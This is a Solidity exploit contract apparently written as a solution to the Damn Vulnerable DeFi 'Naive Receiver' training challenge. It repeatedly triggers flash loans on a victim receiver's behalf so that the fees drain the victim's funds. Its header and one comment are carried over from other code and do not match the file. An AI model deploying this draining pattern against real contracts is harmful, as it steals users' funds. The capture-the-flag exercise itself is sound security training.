// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import {console} from "../Console.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

contract Pool{
    function flashLoan(address borrower, uint256 borrowAmount) external payable {}
}
contract AttackNaiveReceiver is ReentrancyGuard {
    using Address for address;
    // using Address for address payable;

    address payable public pool;

    constructor(address payable poolAddress) {
        pool = poolAddress;
    }

    // Function called by the pool during flash loan
    function attackReceiver(address naiveReceiver, uint256 borrow_amt, uint256 repeatCount) public payable {

        require(naiveReceiver.isContract(), "Borrower must be a deployed contract");

        for (uint256 i=0 ; i<repeatCount; i++){
            // console.log(naiveReceiver);
            Pool(pool).flashLoan(naiveReceiver,borrow_amt);
        }
    }
}